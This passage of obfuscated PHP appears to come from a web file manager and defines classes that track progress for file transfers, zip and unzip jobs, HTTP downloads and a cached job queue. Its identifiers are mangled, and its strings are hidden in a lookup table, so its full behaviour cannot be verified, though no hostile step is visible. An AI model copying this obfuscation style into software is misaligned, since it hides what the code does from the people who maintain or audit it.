$ÓÅ½‘ç[1836]); self::log($ÓÅ½‘ç[1839] . $×ßÀ¯€ . $ÓÅ½‘ç[84] . $İ€Ù˜è . $ÓÅ½‘ç[59] . $œÖ¬£«• . $ÓÅ½‘ç[1840] . $Á˜ˆÆ±[$ÓÅ½‘ç[1820]]); } public function updateFileEnd($îºæõÔÍ, $º¹ùøÚ„) { $áî§İ¦ë =& $_SERVER[Ò°Ì”İ•]; $õøƒ„ø =& $this->task; $õøƒ„ø[$áî§İ¦ë[1820]] = $îºæõÔÍ; $õøƒ„ø[$áî§İ¦ë[1822]] = $º¹ùøÚ„; $õøƒ„ø[$áî§İ¦ë[1826]] += $º¹ùøÚ„; $õøƒ„ø[$áî§İ¦ë[1827]] = $õøƒ„ø[$áî§İ¦ë[1826]]; $this->update(1); self::log($áî§İ¦ë[1841] . $îºæõÔÍ); } public function sourceModelCopy($ˆçë±ÓÏ) { $Ùïî¶ŸÛ =& $_SERVER[Ò°Ì”İ•]; $„“å·÷„ = $ˆçë±ÓÏ[0]; $Ï¦ñ°° = $ˆçë±ÓÏ[1]; $åˆæùõ¾ =& $this->task; $this->sourceModelCopyFlag = !0; $ş¥®»ŒÊ = 0; switch ($„“å·÷„) { case $Ùïî¶ŸÛ[650]: $ş¥®»ŒÊ = 1; break; case $Ùïî¶ŸÛ[653]: $åˆæùõ¾[$Ùïî¶ŸÛ[1820]] = $Ï¦ñ°°[$Ùïî¶ŸÛ[32]]; break; case $Ùïî¶ŸÛ[655]: $ş¥®»ŒÊ = intval($ˆçë±ÓÏ[$Ùïî¶ŸÛ[468]] * 0.4); break; case $Ùïî¶ŸÛ[657]: $ş¥®»ŒÊ = intval($ˆçë±ÓÏ[$Ùïî¶ŸÛ[468]] * 0.2); break; case $Ùïî¶ŸÛ[659]: $ş¥®»ŒÊ = intval($ˆçë±ÓÏ[$Ùïî¶ŸÛ[468]] * 0.4); break; } $this->update($ş¥®»ŒÊ); $this->sourceModelCopyFlag = !1; } public function sourceRemove($ÛÅ±¢ó, $”‡±É½) { $ÓËê¿µâ =& $_SERVER[Ò°Ì”İ•]; $this->sourceModelCopyFlag = !0; $¡Åã‡äØ = 1; if (isset($ÛÅ±¢ó[$ÓËê¿µâ[93]])) { $¡Åã‡äØ = $ÛÅ±¢ó[$ÓËê¿µâ[93]][$ÓËê¿µâ[91]]; $¡Åã‡äØ = $¡Åã‡äØ + $ÛÅ±¢ó[$ÓËê¿µâ[93]][$ÓËê¿µâ[92]] + 1; } $this->update($¡Åã‡äØ); $this->sourceModelCopyFlag = !1; } public function sourceMove($ÀĞ×±Ïã) { $this->sourceRemove($ÀĞ×±Ïã, !1); } public function curlProgress($ÙÒ«×¸, $ïé‡‡Ï, $ŞÓ˜ÒÈ, $€ã¹›˜, $…È¶ó€¤) { $¬ƒ·´ñ =& $_SERVER[Ò°Ì”İ•]; $‘Ö«ÂŒÜ =& $this->task; if ($…È¶ó€¤ > 0) { $‘Ö«ÂŒÜ[$¬ƒ·´ñ[1138]] = $¬ƒ·´ñ[1842]; $‘Ö«ÂŒÜ[$¬ƒ·´ñ[1824]] = $¬ƒ·´ñ[121]; if ($‘Ö«ÂŒÜ[$¬ƒ·´ñ[1822]]) { $‘Ö«ÂŒÜ[$¬ƒ·´ñ[1823]] = $…È¶ó€¤; } if ($‘Ö«ÂŒÜ[$¬ƒ·´ñ[1825]]) { $‘Ö«ÂŒÜ[$¬ƒ·´ñ[1823]] = $…È¶ó€¤ + $‘Ö«ÂŒÜ[$¬ƒ·´ñ[1825]]; } } else { if ($ŞÓ˜ÒÈ > 0) { if ($‘Ö«ÂŒÜ[$¬ƒ·´ñ[1822]] == $ïé‡‡Ï) { $‘Ö«ÂŒÜ[$¬ƒ·´ñ[1823]] = $ŞÓ˜ÒÈ; $‘Ö«ÂŒÜ[$¬ƒ·´ñ[1138]] = $¬ƒ·´ñ[1843]; $‘Ö«ÂŒÜ[$¬ƒ·´ñ[1824]] = $¬ƒ·´ñ[1275]; } } } $this->update(); } public function curlProgressStart($‘µ·í„õ) { } public function curlProgressEnd($Şà”­Ä) { $ŠĞ´×İ€ =& $_SERVER[Ò°Ì”İ•]; $³¬øÖ£Ÿ =& $this->task; $ß·şˆ = curl_getinfo($Şà”­Ä); $Ş¿ÍÂË = $ß·şˆ[$ŠĞ´×İ€[1844]]; if ($Ş¿ÍÂË == -1) { $Ş¿ÍÂË = $ß·şˆ[$ŠĞ´×İ€[1845]]; } if ($³¬øÖ£Ÿ[$ŠĞ´×İ€[1824]] == $ŠĞ´×İ€[121] && $Ş¿ÍÂË) { $³¬øÖ£Ÿ[$ŠĞ´×İ€[1825]] += $Ş¿ÍÂË; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $ùÈïõ· =& $_SERVER[Ò°Ì”İ•]; $ùÜ„¯Şğ =& $this->task; $ùÜ„¯Şğ[$ùÈïõ·[1846]] = 1; Hook::bind($ùÈïõ·[1814], array($this, $ùÈïõ·[1847])); Hook::bind($ùÈïõ·[1816], array($this, $ùÈïõ·[1848])); Hook::bind($ùÈïõ·[1818], array($this, $ùÈïõ·[1849])); } protected function endAfter() { $‹í¡Í¦ =& $_SERVER[Ò°Ì”İ•]; Hook::unbind($‹í¡Í¦[1814], array($this, $‹í¡Í¦[1847])); Hook::unbind($‹í¡Í¦[1816], array($this, $‹í¡Í¦[1848])); Hook::unbind($‹í¡Í¦[1818], array($this, $‹í¡Í¦[1849])); } public function progressStart($ßŠ£òáö) { $æÉ¾ –í =& $_SERVER[Ò°Ì”İ•]; $ ÷áÖËË = curl_getinfo($ßŠ£òáö); self::log($æÉ¾ –í[1850] . $ ÷áÖËË[$æÉ¾ –í[394]]); self::valueSet($this->task[$æÉ¾ –í[487]], $this->task); } public function progressEnd($—¾ŠÇÉ) { $¾±»Ğä¤ =& $_SERVER[Ò°Ì”İ•]; self::log($¾±»Ğä¤[1851] . $this->task[$¾±»Ğä¤[487]]); $this->end(); } public function progress($‡ÓÛí½•, $É¬¨Î·ã, $ÆåÖîõ, $ô“¾¤Ë, $ûŠæéÛ§) { $Êü¨•à† =& $_SERVER[Ò°Ì”İ•]; $çòÚÉÅö =& $this->task; if ($ûŠæéÛ§ > 0) { $çòÚÉÅö[$Êü¨•à†[1136]] = $çòÚÉÅö[$Êü¨•à†[1136]] == 0 ? $ô“¾¤Ë : $çòÚÉÅö[$Êü¨•à†[1136]]; $çòÚÉÅö[$Êü¨•à†[1769]] = $ûŠæéÛ§; } else { if ($ÆåÖîõ > 0) { $çòÚÉÅö[$Êü¨•à†[1136]] = $çòÚÉÅö[$Êü¨•à†[1136]] == 0 ? $É¬¨Î·ã : $çòÚÉÅö[$Êü¨•à†[1136]]; $çòÚÉÅö[$Êü¨•à†[1769]] = $ÆåÖîõ; } } $this->update(); self::log("\x70\x72\x6f\147\162\x65\163\163\110\164\164\x70\72\144\157\x77\x6e\x3a{$ÆåÖîõ}\57{$É¬¨Î·ã}\x3b\40\165\160\x6c\x6f\141\x64\72{$ûŠæéÛ§}\x2f{$ô“¾¤Ë}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($‘ ğ¡Ûå, $“ÑçÔĞÕ = '', $ğÀ£Ğ¤ = 0, $¹Çî§¶Ø = '') { $ØíÈö° =& $_SERVER[Ò°Ì”İ•]; $¹Çî§¶Ø = $¹Çî§¶Ø ? $¹Çî§¶Ø : ($“ÑçÔĞÕ ? $“ÑçÔĞÕ : $‘ ğ¡Ûå); $Ìêıäªü = new Task($‘ ğ¡Ûå, $“ÑçÔĞÕ, $ğÀ£Ğ¤, $¹Çî§¶Ø); $GLOBALS[$ØíÈö°[1852] . $‘ ğ¡Ûå] = new TaskLog($ØíÈö°[1751], $Ìêıäªü, $¹Çî§¶Ø); return $Ìêıäªü; } public function __construct($¼®‚ªëí = '', $‹€¼Ş¥ = '', $áŸº®ûÓ = '') { $²ÆĞ´ñº =& $_SERVER[Ò°Ì”İ•]; if (!$¼®‚ªëí) { $¼®‚ªëí = $²ÆĞ´ñº[1751]; } $öá½“Ş… = $¼®‚ªëí . $²ÆĞ´ñº[474] . rand_string(10); if (!$áŸº®ûÓ) { $áŸº®ûÓ = $¼®‚ªëí . $²ÆĞ´ñº[53] . $áŸº®ûÓ; } switch ($¼®‚ªëí) { case $²ÆĞ´ñº[1751]: if (!$‹€¼Ş¥ || !$‹€¼Ş¥->task) { return echoLog($¼®‚ªëí . $²ÆĞ´ñº[1853]); } $Ç¦Ş£‡ = $‹€¼Ş¥; $öá½“Ş… = $Ç¦Ş£‡->task[$²ÆĞ´ñº[487]]; $¼®‚ªëí = $Ç¦Ş£‡->task[$²ÆĞ´ñº[487]]; if (!$Ç¦Ş£‡->task[$²ÆĞ´ñº[1656]]) { $Ç¦Ş£‡->task[$²ÆĞ´ñº[1656]] = $áŸº®ûÓ ? $áŸº®ûÓ : $¼®‚ªëí; } break; case $²ÆĞ´ñº[1854]: if (!$‹€¼Ş¥) { return echoLog($¼®‚ªëí . $²ÆĞ´ñº[1855]); } $ÈËÕœèè = is_string($‹€¼Ş¥) ? array($‹€¼Ş¥) : $‹€¼Ş¥; $Ç¦Ş£‡ = new TaskFileTransfer($öá½“Ş…, $¼®‚ªëí, 0, $áŸº®ûÓ ? $áŸº®ûÓ : $ÈËÕœèè[0]); foreach ($ÈËÕœèè as $Ãçõ±Ä½) { $Ç¦Ş£‡->addPath($Ãçõ±Ä½); } break; case $²ÆĞ´ñº[400]: if (!$‹€¼Ş¥) { return echoLog($¼®‚ªëí . $²ÆĞ´ñº[1855]); } $ÈËÕœèè = is_string($‹€¼Ş¥) ? array($‹€¼Ş¥) : $‹€¼Ş¥; $Ç¦Ş£‡ = new TaskZip($öá½“Ş…, $¼®‚ªëí, 0, $áŸº®ûÓ ? $áŸº®ûÓ : $ÈËÕœèè[0]); foreach ($ÈËÕœèè as $Ãçõ±Ä½) { $Ç¦Ş£‡->addPath($Ãçõ±Ä½); } break; case $²ÆĞ´ñº[1295]: if (!$‹€¼Ş¥) { return echoLog($¼®‚ªëí . $²ÆĞ´ñº[1855]); } $Ç¦Ş£‡ = new TaskUnZip($öá½“Ş…, $¼®‚ªëí, 0, $áŸº®ûÓ ? $áŸº®ûÓ : $‹€¼Ş¥); if ($‹€¼Ş¥) { $Ç¦Ş£‡->addFile($‹€¼Ş¥); } break; case $²ÆĞ´ñº[163]: $Ç¦Ş£‡ = new TaskHttp($öá½“Ş…, $¼®‚ªëí); break; default: return; break; } $this->task = $Ç¦Ş£‡; $this->taskID = $öá½“Ş…; Hook::bind($²ÆĞ´ñº[1789], array($this, $²ÆĞ´ñº[1856])); Hook::bind($²ÆĞ´ñº[1791], array($this, $²ÆĞ´ñº[1857])); Hook::bind($²ÆĞ´ñº[1785], array($this, $²ÆĞ´ñº[1858])); echoLog($²ÆĞ´ñº[1859] . $Ç¦Ş£‡->task[$²ÆĞ´ñº[1656]]); } public function __destruct() { $this->end(); } public function end($¥Ğ®İµ = '') { $Òã‹äÙ‘ =& $_SERVER[Ò°Ì”İ•]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($¥Ğ®İµ); $this->task = !1; $this->taskID = !1; Hook::unbind($Òã‹äÙ‘[1789], array($this, $Òã‹äÙ‘[1856])); Hook::unbind($Òã‹äÙ‘[1791], array($this, $Òã‹äÙ‘[1857])); Hook::unbind($Òã‹äÙ‘[1785], array($this, $Òã‹äÙ‘[1858])); } public function taskUpdate($Œòùº…¸) { $ë÷š×ä =& $_SERVER[Ò°Ì”İ•]; if (!$Œòùº…¸ || $this->taskID != $Œòùº…¸[$ë÷š×ä[487]]) { return; } $¦Õ¡ò´ú = 20; $·ÅéÌ‹¾ = intval($Œòùº…¸[$ë÷š×ä[1770]] * $¦Õ¡ò´ú); $ß€ ò…• = $ë÷š×ä[187] . str_repeat($ë÷š×ä[518], $·ÅéÌ‹¾) . $ë÷š×ä[1087] . str_repeat($ë÷š×ä[53], $¦Õ¡ò´ú - $·ÅéÌ‹¾) . $ë÷š×ä[189]; $ª¬öØá· = $ß€ ò…• . sprintf($ë÷š×ä[1860], $Œòùº…¸[$ë÷š×ä[1770]] * 100) . $ë÷š×ä[1861]; $É¸•ĞÂë = $ª¬öØá· . $Œòùº…¸[$ë÷š×ä[1769]] . $ë÷š×ä[8] . $Œòùº…¸[$ë÷š×ä[1136]] . LNG($ë÷š×ä[1862]); $¸¶É™“ = $ë÷š×ä[12]; if ($Œòùº…¸[$ë÷š×ä[1846]]) { $É¸•ĞÂë = $ª¬öØá· . size_format($Œòùº…¸[$ë÷š×ä[1769]]) . $ë÷š×ä[8] . size_format($Œòùº…¸[$ë÷š×ä[1136]]); $¸¶É™“ = size_format($Œòùº…¸[$ë÷š×ä[1771]]) . $ë÷š×ä[1863]; } if ($Œòùº…¸[$ë÷š×ä[1138]]) { $Œòùº…¸[$ë÷š×ä[1820]] = $Œòùº…¸[$ë÷š×ä[1138]] . $ë÷š×ä[53] . $Œòùº…¸[$ë÷š×ä[1820]]; } if ($Œòùº…¸[$ë÷š×ä[1820]]) { $ÌÊ¢ì•‹ = $ë÷š×ä[12]; if ($Œòùº…¸[$ë÷š×ä[1822]]) { $ÌÊ¢ì•‹ = $ë÷š×ä[50] . size_format($Œòùº…¸[$ë÷š×ä[1823]]) . $ë÷š×ä[8] . size_format($Œòùº…¸[$ë÷š×ä[1822]]); } $¸¶É™“ .= $Œòùº…¸[$ë÷š×ä[1820]] . $ÌÊ¢ì•‹; } if ($Œòùº…¸[$ë÷š×ä[836]] && !$Œòùº…¸[$ë÷š×ä[1822]]) { $¸¶É™“ .= $ë÷š×ä[53] . size_format($Œòùº…¸[$ë÷š×ä[1827]]) . $ë÷š×ä[8] . size_format($Œòùº…¸[$ë÷š×ä[836]]); } echoLog($É¸•ĞÂë . $ë÷š×ä[53] . $¸¶É™“, !0); } public function taskEnd($çÃÂÕÙ¬) { $½ÔÛú‚€ =& $_SERVER[Ò°Ì”İ•]; if (!$çÃÂÕÙ¬ || $this->taskID != $çÃÂÕÙ¬[$½ÔÛú‚€[487]]) { return; } $£¿ñ³Üğ = $çÃÂÕÙ¬ ? LNG($½ÔÛú‚€[1864]) . $½ÔÛú‚€[4] . $çÃÂÕÙ¬[$½ÔÛú‚€[1769]] . $½ÔÛú‚€[8] . $çÃÂÕÙ¬[$½ÔÛú‚€[1136]] . LNG($½ÔÛú‚€[1862]) . $½ÔÛú‚€[85] : $½ÔÛú‚€[12]; echoLog($½ÔÛú‚€[1865] . $çÃÂÕÙ¬[$½ÔÛú‚€[1656]] . ($çÃÂÕÙ¬[$½ÔÛú‚€[538]] ? $½ÔÛú‚€[85] . $çÃÂÕÙ¬[$½ÔÛú‚€[538]] : $½ÔÛú‚€[12]) . $½ÔÛú‚€[85] . $£¿ñ³Üğ . $½ÔÛú‚€[1866] . sprintf($½ÔÛú‚€[925], timeFloat() - $çÃÂÕÙ¬[$½ÔÛú‚€[1772]]) . $½ÔÛú‚€[1784]); $this->end(); } public function taskKill($˜ãİö×©) { $¶Úóñè =& $_SERVER[Ò°Ì”İ•]; if (!$˜ãİö×© || $this->taskID != $˜ãİö×©[$¶Úóñè[487]]) { return; } echoLog($¶Úóñè[1867] . $˜ãİö×©[$¶Úóñè[1656]]); } } goto dô¤çİÉºª; dô¤çİÉºª: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\141\163\x6b\121\165\145\165\145\x4c\145\x6e\147\x74\150"; const QUEUE_DATA = "\164\141\163\153\x51\x75\x65\165\x65\x44\x61\164\x61"; const QUEUE_TIME = "\164\141\x73\153\121\x75\145\x75\x65\114\x61\163\x74\x52\165\x6e"; const QUEUE_THREAD = "\x74\x61\163\153\121\x75\x65\165\145\x54\x68\x72\x65\141\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($Ïìœ·à¹, $åİš‚ª¶ = array(), $¿ÈÑù– = '', $¾àË¡Éæ = '') { $°È÷¼‹ =& $_SERVER[Ò°Ì”İ•]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($¾àË¡Éæ && array_find_by_field(self::$listData, $°È÷¼‹[108], $¾àË¡Éæ)) { return !0; } if ($¾àË¡Éæ && array_find_by_field(self::$listDataAdd, $°È÷¼‹[108], $¾àË¡Éæ)) { return !0; } self::$listDataAdd[] = array($°È÷¼‹[353] => $Ïìœ·à¹, $°È÷¼‹[1868] => $åİš‚ª¶, $°È÷¼‹[538] => $¿ÈÑù–, $°È÷¼‹[108] => $¾àË¡Éæ); return !0; } public static function addSubmit() { $­˜©¾ë =& $_SERVER[Ò°Ì”İ•]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($­˜©¾ë[1869] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $­˜©¾ë[12], $­˜©¾ë[538])), $­˜©¾ë[208]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($üã¢İÔ, $¬‘°ÆÕå = array(), $ó³À˜•³ = '', $÷îçµ‰£ = '') { $äëşÓƒ =& $_SERVER[Ò°Ì”İ•]; if (self::count() >= self::MAX_LENGTH) { return !1; } $Ôóùú ® = self::getAll(); if ($÷îçµ‰£ && array_find_by_field($Ôóùú ®, $äëşÓƒ[108], $÷îçµ‰£)) { return !0; } $Ôóùú ®[] = array($äëşÓƒ[353] => $üã¢İÔ, $äëşÓƒ[1868] => $¬‘°ÆÕå, $äëşÓƒ[538] => $ó³À˜•³, $äëşÓƒ[108] => $÷îçµ‰£); self::setAll($Ôóùú ®); write_log($äëşÓƒ[1869] . $ó³À˜•³, $äëşÓƒ[208]); return !0; } public static function run() { $ÇÀßğ¿ =& $_SERVER[Ò°Ì”İ•]; $­£ö‡Ÿˆ = self::getAll(); $‚»ÃãûÅ = array_shift($­£ö‡Ÿˆ); if (!$‚»ÃãûÅ) { return !1; } self::setAll($­£ö‡Ÿˆ); $¬Êûµİ = timeFloat(); $üô·ÙÇÔ = $ÇÀßğ¿[12]; try { $üô·ÙÇÔ = Hook::apply($‚»ÃãûÅ[$ÇÀßğ¿[353]], $‚»ÃãûÅ[$ÇÀßğ¿[1868]]); } catch (Exception $¢êèòà) { write_log($¢êèòà, $ÇÀßğ¿[1260]); } $ Äí³²ª = number_format(timeFloat() - $¬Êûµİ, 3) . $ÇÀßğ¿[1784]; if ($üô·ÙÇÔ && is_string($üô·ÙÇÔ)) { $ Äí³²ª = $ Äí³²ª . $ÇÀßğ¿[1870] . $üô·ÙÇÔ; } write_log($ÇÀßğ¿[1871] . $‚»ÃãûÅ[$ÇÀßğ¿[538]] . $ÇÀßğ¿[1872] . $ Äí³²ª, $ÇÀßğ¿[208]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $ººæÖ¢° =& $_SERVER[Ò°Ì”İ•]; $‚ò¥í•¾ = self::threadCount() + 1; if ($‚ò¥í•¾ > 3 || !self::count()) { return; } write_log($ººæÖ¢°[1873] . $‚ò¥í•¾, $ººæÖ¢°[208]); Cache::set(self::QUEUE_THREAD, $‚ò¥í•¾, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($ººæÖ¢°[1874], $ººæÖ¢°[208]); } public static function getKey($»áàØÍ, $×İ‚Ôˆ = "\x69\x6e\x74") { $¨ƒ¡‘› =& $_SERVER[Ò°Ì”İ•]; Cache::removeMemory($»áàØÍ); $ä¬²±– = Cache::get($»áàØÍ); if ($×İ‚Ôˆ == $¨ƒ¡‘›[375]) { return $ä¬²±– ? intval($ä¬²±–) : 0; } if ($×İ‚Ôˆ == $¨ƒ¡‘›[1875]) { return is_array($ä¬²±–) ? $ä¬²±– : array(); } return $ä¬²±–; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[Ò°Ì”İ•][1875]); } public static function setAll($õ¿şÂÊ) { $Â±á™ïõ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($õ¿şÂÊ), $Â±á™ïõ); Cache::set(self::QUEUE_DATA, $õ¿şÂÊ, $Â±á™ïõ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($œ‰«£ç÷, $àğğ‘‘Ó = 5.0) { if (!$œ‰«£ç÷) { return; } $§ŠÆÉ„¢ = Cache::get($œ‰«£ç÷); if (!$§ŠÆÉ„¢ || timeFloat() - floatVal($§ŠÆÉ„¢) >= $àğğ‘‘Ó) { Cache::set($œ‰«£ç÷, timeFloat(), $àğğ‘‘Ó * 10); return !0; } return !1; } public static function timeLimitCall($ ‹„¶’ƒ, $”‹ÁğÔ, $¢Ö¶„ˆô, $öœ¼˜Œ = 5.0) { $ŸşóÍÔ =& $_SERVER[Ò°Ì”İ•]; if (!$ ‹„¶’ƒ || !$”‹ÁğÔ) { return; } self::$asyncAdd = !0; $¯İô¥ˆ = $ŸşóÍÔ[1876]; $ŠŠÂ½•Ü = Cache::get($¯İô¥ˆ, !0); $é´æ…•è = array($ŸşóÍÔ[1877] => timeFloat(), $ŸşóÍÔ[1878] => timeFloat(), $ŸşóÍÔ[353] => $”‹ÁğÔ, $ŸşóÍÔ[1868] => $¢Ö¶„ˆô, $ŸşóÍÔ[217] => $öœ¼˜Œ); if (is_array($ŠŠÂ½•Ü[$ ‹„¶’ƒ])) { $é´æ…•è[$ŸşóÍÔ[1878]] = $ŠŠÂ½•Ü[$ ‹„¶’ƒ][$ŸşóÍÔ[1878]]; } if (is_array($ŠŠÂ½•Ü[$ ‹„¶’ƒ])) { if (timeFloat() - $ŠŠÂ½•Ü[$ ‹„¶’ƒ][$ŸşóÍÔ[1877]] < $é´æ…•è[$ŸşóÍÔ[217]] * 0.3) { return; } $é´æ…•è[$ŸşóÍÔ[1878]] = $ŠŠÂ½•Ü[$ ‹„¶’ƒ][$ŸşóÍÔ[1878]]; } $ŠŠÂ½•Ü[$ ‹„¶’ƒ] = $é´æ…•è; Cache::set($¯İô¥ˆ, $ŠŠÂ½•Ü, 60); Cache::removeMemory($¯İô¥ˆ); write_log($ŸşóÍÔ[1879] . $ ‹„¶’ƒ . $ŸşóÍÔ[85] . $”‹ÁğÔ, $ŸşóÍÔ[208]); } public static function timeLimitCallLoop() { $Î¯ŠÃÎ =& $_SERVER[Ò°Ì”İ•]; $»úä¥åÅ = array($Î¯ŠÃÎ[1880]); $â×ÕÇã = in_array(strtolower(ACTION), $»úä¥åÅ); if (!$â×ÕÇã && !self::$asyncAdd) { return; } $•…øõ»å = $Î¯ŠÃÎ[1876]; $Úé„ŸÏì = Cache::get($•…øõ»å, !0); if (!$Úé„ŸÏì || count($Úé„ŸÏì) <= 0) { return; } $×„×Şù = !1; $é™ˆª‚º = timeFloat(); $Ş‡ŸÄÆ = array(); foreach ($Úé„ŸÏì as $ŞŸƒßö« => $ÕÁñ•¦†) { if ($é™ˆª‚º - $ÕÁñ•¦†[$Î¯ŠÃÎ[1878]] > $ÕÁñ•¦†[$Î¯ŠÃÎ[217]]) { $×„×Şù = !0; try { Hook::apply($ÕÁñ•¦†[$Î¯ŠÃÎ[353]], $ÕÁñ•¦†[$Î¯ŠÃÎ[1868]]); write_log($Î¯ŠÃÎ[1881] . $ŞŸƒßö« . $Î¯ŠÃÎ[85] . $ÕÁñ•¦†[$Î¯ŠÃÎ[353]] . $Î¯ŠÃÎ[1882] . ACTION, $Î¯ŠÃÎ[208]); } catch (Exception $µ¹¸Ê¬Æ) { } continue; } $Ş‡ŸÄÆ[$ŞŸƒßö«] = $ÕÁñ•¦†; } if (!$×„×Şù) { return; } if (!$Ş‡ŸÄÆ) { return Cache::remove($•…øõ»å); } Cache::set($•…øõ»å, $Ş‡ŸÄÆ, 60); Cache::removeMemory($•…øõ»å); } public static function finished($¤óğ¡È¢, $˜¢¨Ñóœ) { $ää•™ß„ =& $_SERVER[Ò°Ì”İ•]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ää•™ß„[353] => $¤óğ¡È¢, $ää•™ß„[1868] => $˜¢¨Ñóœ); } private static function finishedRun() { $â‹Ì¥°» =& $_SERVER[Ò°Ì”İ•]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $©†¹õúÊ) { try { Hook::apply($©†¹õúÊ[$â‹Ì¥°»[353]], $©†¹õúÊ[$â‹Ì¥°»[1868]]); } catch (Exception $½ÕÙñÛ®) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $©Ì¯È—„ =& $_SERVER[Ò°Ì”İ•]; parent::startAfter(); Hook::bind($©Ì¯È—„[1883], array($this, $©Ì¯È—„[1884])); Hook::bind($©Ì¯È—„[1274], array($this, $©Ì¯È—„[1885])); Hook::bind($©Ì¯È—„[1886], array($this, $©Ì¯È—„[1887])); $€“·Øèş =& $this->task; $€“·Øèş[$©Ì¯È—„[1888]] = $©Ì¯È—„[1275]; if (!$€“·Øèş[$©Ì¯È—„[1656]]) { $€“·Øèş[$©Ì¯È—„[1656]] = LNG($©Ì¯È—„[1889]); } } protected function endAfter() { $‚ëØŒù¥ =& $_SERVER[Ò°Ì”İ•]; parent::endAfter(); Hook::unbind($‚ëØŒù¥[1883], array($this, $‚ëØŒù¥[1884])); Hook::unbind($‚ëØŒù¥[1274], array($this, $‚ëØŒù¥[1885])); Hook::unbind($‚ëØŒù¥[1886], array($this, $‚ëØŒù¥[1887])); } public function updateAfter() { $øÉĞşê« =& $_SERVER[Ò°Ì”İ•]; $ÔÍ‡áî¬ =& $this->task; if (!$ÔÍ‡áî¬[$øÉĞşê«[1136]] || !$ÔÍ‡áî¬[$øÉĞşê«[836]]) { if ($ÔÍ‡áî¬[$øÉĞşê«[1888]] != $øÉĞşê«[400]) { return; } } if ($ÔÍ‡áî¬[$øÉĞşê«[1888]] == $øÉĞşê«[1275]) { $Éœè™İ = 0; if ($ÔÍ‡áî¬[$øÉĞşê«[1822]]) { $Éœè™İ = $ÔÍ‡áî¬[$øÉĞşê«[1823]] / $ÔÍ‡áî¬[$øÉĞşê«[1822]]; } $ÔÍ‡áî¬[$øÉĞşê«[1770]] = $Éœè™İ * 0.3; } else { if ($ÔÍ‡áî¬[$øÉĞşê«[1888]] == $øÉĞşê«[400]) { $Éœè™İ = $ÔÍ‡áî¬[$øÉĞşê«[1769]] / $ÔÍ‡áî¬[$øÉĞşê«[1136]]; $ÔÍ‡áî¬[$øÉĞşê«[1770]] = 0.3 + $Éœè™İ * 0.4; } else { if ($ÔÍ‡áî¬[$øÉĞşê«[1888]] == $øÉĞşê«[121]) { $‹ËŸĞŞ­ = 0; if ($ÔÍ‡áî¬[$øÉĞşê«[1824]] == $øÉĞşê«[121]) { $‹ËŸĞŞ­ = $ÔÍ‡áî¬[$øÉĞşê«[1823]]; } $Éœè™İ = ($ÔÍ‡áî¬[$øÉĞşê«[1827]] + $‹ËŸĞŞ­) / $ÔÍ‡áî¬[$øÉĞşê«[836]]; $ÔÍ‡áî¬[$øÉĞşê«[1770]] = 0.3 + 0.4 + $Éœè™İ * 0.3; } } } if ($ÔÍ‡áî¬[$øÉĞşê«[1770]] > 0) { $Ä‘³ãƒå = timeFloat() - $ÔÍ‡áî¬[$øÉĞşê«[1772]] - $ÔÍ‡áî¬[$øÉĞşê«[1775]]; $ÔÍ‡áî¬[$øÉĞşê«[1776]] = $Ä‘³ãƒå * (1 - $ÔÍ‡áî¬[$øÉĞşê«[1770]]) / $ÔÍ‡áî¬[$øÉĞşê«[1770]]; } } public function addFile($´¬ÕâÍ) { $â®¿íÁá =& $_SERVER[Ò°Ì”İ•]; $ÊÃßğŠ³ =& $this->task; $µÁ×…ò = IO::info($´¬ÕâÍ); $ÊÃßğŠ³[$â®¿íÁá[1820]] = $µÁ×…ò[$â®¿íÁá[32]]; $ÊÃßğŠ³[$â®¿íÁá[1822]] = $µÁ×…ò[$â®¿íÁá[90]]; $ÊÃßğŠ³[$â®¿íÁá[1823]] = 0; $ÊÃßğŠ³[$â®¿íÁá[1138]] = $â®¿íÁá[1843]; $ÊÃßğŠ³[$â®¿íÁá[1824]] = $â®¿íÁá[1275]; $ÊÃßğŠ³[$â®¿íÁá[836]] = $µÁ×…ò[$â®¿íÁá[90]]; $ÊÃßğŠ³[$â®¿íÁá[1136]] = 1; $î¾‰…¿– = 0; $ÊÃßğŠ³[$â®¿íÁá[1831]] = array($â®¿íÁá[1832] => $î¾‰…¿– + 1, $â®¿íÁá[506] => $µÁ×…ò[$â®¿íÁá[32]], $â®¿íÁá[98] => $µÁ×…ò[$â®¿íÁá[98]], $â®¿íÁá[594] => $µÁ×…ò[$â®¿íÁá[594]] ? $µÁ×…ò[$â®¿íÁá[594]] : $µÁ×…ò[$â®¿íÁá[98]]); $this->update(); } public function zipEvent($„â·ôÖ, $ôéÙÕÍñ, $Ÿ’õ­ûæ, $Õ¿ì³æ) { $ªÏÈ½ä =& $_SERVER[Ò°Ì”İ•]; $Ş¹£²è¨ =& $this->task; $Ş¹£²è¨[$ªÏÈ½ä[1820]] = get_path_this($ôéÙÕÍñ); $Ş¹£²è¨[$ªÏÈ½ä[1822]] = 